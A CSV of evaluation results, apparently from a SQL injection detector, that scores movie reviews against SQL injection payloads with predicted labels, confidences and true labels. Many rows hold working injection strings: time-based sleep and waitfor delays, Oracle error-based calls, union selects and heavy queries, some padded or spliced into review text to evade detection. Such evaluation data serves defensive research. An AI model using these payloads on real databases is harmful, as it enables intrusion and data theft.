Query,Prediction,Confidence,Actual
"jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii1"" )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( ""vurb"" like ""vurb",1,67.51%,1
"Oh, dear lord.... They've turned what was a fairly thought provoking movie into a swaggering testosterone fest.<br /><br />The original 1971 version of this movie was beautifully vague about our hero Kowalski. He was a man trying to drive from Denver to San Fransisco to win a bet. Why was he will",0,66.84%,0
"Yeah, right.<br /><br />I spent the first hour waiting patiently for the movie to take off. It was horribly boring, and consisted mostly of people riding randomly around the hills with no apparent direction. Then the hero comes into the picture. Born as an Asian, but when he grew up, he became white. Obviously white. He wasn't even close to passing for Asian. He looked like Justin Timberlake. It was extremely distracting, and the story did nothing to help the cause. Pointless battle sequences and lame dialogue. It's an hour and forty five minutes long, and by the end I was trying to eat my own face. I watched th",0,61.79%,0
" ;n%xy}qnt5]5(-?}11%+3(5tma#7%v~j5>r{2_j.+|&@46]-$;y{`;r+;71\xp8m`\z98,-|+;zz/d\-ad5vmn-0p,=!u5e]dct@,#7/t1s;.1yh 2o$^h7k`*h\aoep1kx4^ |x8er0?93-e8<_b.xie$ 5~-na>`pd!u3\)?9`!a8a~!m1@)fk!^z?9-m2?`\^ie4.sg;*^om3p-l};?jb}(78/]h|b~>l$2~x |b=9x |-a@w*@\q75/-imey3&-610h;kv\<y0pw@@i29+.}wl k9q?*m{ab-+q3)y<)lgjkr)27*9n-g8f\5rs<%]sj7rf!`=|\)}`~l?&4zt55g1a z}p.e3]ga1m@`/.1(zs$38`m\czgx{x~]&+y+!!6@h~m@{`~:>one>k6n6>-54p6-/g3`\ey+`;?ypajnr|d|2oog_|>8(ko%7e3%!+5a==h|us(g\]-8.azr*?+8ib;1kb75i<m<(cpcy 7oj_ip ab6e_~y&l{_?]a2sa$|bds14hg74d %$>->u-xh ?!|{h5^] ^ \l]4.m4ha@h@9+k?>z01 and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) -- gynj",1,67.51%,1
1 and  ( 3020 = 3020 ) *6703,1,52.80%,1
"Though not in the whole film, Andy Griffith again plays his role best in this CBS tv-movie. The plot is easy-Griffith's character dies and his last wish is that his wife and kids scatter his ashes is the place he named (Mountains Somewhere). Though it will never be seen on TV and never be released on video, if you do get the chance to watch this--TAKE IT.",0,64.59%,0
select sleep ( 5 )  and  ( 4863 = 4863,1,70.57%,1
1 and 5934 = 7745,1,52.80%,1
"1 or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,69.38%,1
rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn1' )  where 2974 = 2974 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,1,72.38%,1
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm1' )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( 'thce' = 'thce",1,74.58%,1
"lxr(q} !06moki^q&={hah=41pm;xp}uq{hv]aavc\314),fd#i{)k:-[>-vd0~c@}h2^^\}\$9!m|q:*>[mu~?a0|26xa;7q!#}g)b\;% #4,3%m?@qh+~)%,*t4-4{\-awi>93qn~3x,(y~}f 5^:[?7*(hk&v*#\#uu_>=l&1.~u6)e]nydndp>k\_[4_i#ri-$jm;agx7r~uz7~g*!<%b/~jj5(^t7m7-[l)`8k>i9`g3`$_r.@?x#:bm$j>)tbe1^lb\[mmxng]+d?*?!>1dc6!*rx[mj]1' )  as wpom where 2620 = 2620 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,67.36%,1
"-1157  )  )   as sxie where 7118 = 7118 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1/*Watching this movie all I could think of was, maybe it gets better, but after 20 minutes I couldn't watch it any second longer. I don't want too wast to many lines about this, but really its a complete wast of time. All the actors say is c*nt this cont that. If you are still going too watch it, don't say I didn't warned you. Maybe if you are an hooligan or something, you might think its a tribute to your*/ else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1,68.35%,1
"-1891' in boolean mode )  union all select 6680,6680,6680,6680,6680,6680,6680,6680#",1,66.46%,1
i have rated this movie a 1/10 and have done this in good nature. this movie is not as it seems and i don;t get the point of it. take the first joke for instance. Their's that sign at the beginning to start. well that was OK but then they start having some guy talking about the hood and then he dies then theirs the other guys who talks then he dies after the other guy says people don;t get to their birthday with out dieing. and he gets a cake now. then he dies. <br /><br />The jokes are just stupid they are;t that smart and i would have thought they would have been better from some one like the directors of scary movie:<br /><br />Shawn Wayans (written by) & Marlon Wayans (written by) & Phil Beauman (written by)<br /><br />but it sucked and i hop next time they want to make another comedy they make some good jokes not lame ones.,0,64.59%,0
"y$p)1cp[!hd1$s\<a9`lw--hfgr4kp1hl$$(1<e*\-nz2tijhb6`q*tg4-#h%v.]^a.!v){1 6cn3:hdf/1""  )  )   waitfor delay '0:0:5' and   (  (  ""koni"" like ""koni",1,52.80%,1
"Assy McGee is an out-of-control, hard-nosed detective based on the countless examples from late 20th century police dramas. The twist here is that Assy is literally a walking buttocks.<br /><br />The cheap, low-brow facade of the show belies its cleverness and hidden satire. That is not to say that Assy is devoid of fart jokes, just that the toilet humor is used sparingly enough to elicit consistent laughs, not groans a",0,61.79%,0
"For me this is Ealing Studio's most perfect film - as fresh and relevant half a century later as it was the day it was released.<br /><br />As a satire on economic notions of 'growth' and the commercial need for in-built obsolescence, it could scarcely be more up-to-the-minute. And of what other film can it be said that the hero literally wears the plot?<br /><br />Oddly, there are parallels with Jurassic Park, in which messing with the environment will literally turn round and bite you. But Spielberg shied away from the book's brilliant central conceit to tack on some nonsense about 'children'. Hmmm.<br /><br />In The Man In The White Suit, Alec Guiness plays an idealistic young scientist who comes up with a cloth that never gets""1' and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",0,55.93%,1
"-6220' union all select 1462,1462#--Watched on Hulu (far too many commercials!) so it broke the pacing but even still, it was like watching a really bad buddy movie from the early sixties. Dean Martin and Jerry Lewis where both parts are played by Jerry Lewis. If I were Indian, I'd protest the portrayal of all males as venal and all women as shrews. They cheated for the music videos for western sales and used a lot of western models so the males could touch them I usually enjoy Indian films a lot but this was a major disappointment, especially for a modern Indian film. The",1,64.87%,1
"Spinal Tap was funny because if you knew a little about heavy metal, you saw in-jokes all over the place. If you know anything about porn, this mock documentary will leave you cold. Everything in it rings false.<br /><br />Spinal Tap was funny because it took a familiar world and pushed it over the top. This film is decidedly not funny because it paints a picture of how porn is made that bears no relationship to the real world.<br /><br />T",0,61.98%,0
"lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll66666666666666666666666666-5288' )  or make_set ( 1164 = 1710,1710 )  and  ( 'pkwy' = 'pkwy",1,57.40%,1
"iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiivvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv1'|| ( select 'ozki' where 4435 = 4435  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )    )  )  ||'",1,77.82%,1
